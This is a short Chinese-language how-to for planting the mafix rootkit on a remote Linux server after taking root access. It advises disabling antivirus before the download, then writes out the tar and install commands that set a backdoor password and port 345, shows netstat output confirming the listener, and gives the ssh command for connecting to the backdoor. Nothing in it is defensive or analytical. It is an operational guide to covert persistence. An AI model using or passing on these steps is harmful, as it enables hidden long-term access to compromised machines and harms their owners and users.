1.首先是获得远程服务器的root权限，当然这是必须的。

2.然后下载rootkit程序，本文用到的是mafix，可以点击下载，也可以到附件中去下载。

下载前做好把杀毒软件关掉，基本上汇报毒的。

3.开始安装

tar zxvf mafix.tar.gz

cd mafix

./root rootkit 345 (其中rootkit为你连接后门程序时的密码，345为连接的端口)

可以验证一下是否成功：

[root@localhost ~]# netstat -anlp|grep 345 tcp 0 0 0.0.0.0:345 0.0.0.0:* LISTEN 11280/ttyload

可以看到，345端口已经在监听了。

4.连接后门程序

其实没什么说的，ssh就可以了

ssh 192.168.211.128 -p 345